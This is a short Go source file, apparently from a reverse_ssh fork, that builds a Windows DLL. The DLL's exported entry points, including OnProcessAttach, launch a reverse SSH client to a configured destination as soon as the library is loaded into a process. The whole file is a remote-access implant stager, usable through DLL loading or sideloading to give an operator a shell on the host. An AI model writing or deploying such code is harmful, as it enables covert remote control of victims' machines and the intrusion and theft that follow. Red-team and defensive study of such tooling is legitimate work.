//go:build windows && cgo && cshared

package main

import "C"
import "github.com/QU35T-code/reverse_ssh/sources/client"

//export VoidFunc
func VoidFunc() {
	client.Run(destination, fingerprint, "")
}

//export OnProcessAttach
func OnProcessAttach() {
	client.Run(destination, fingerprint, "")
}
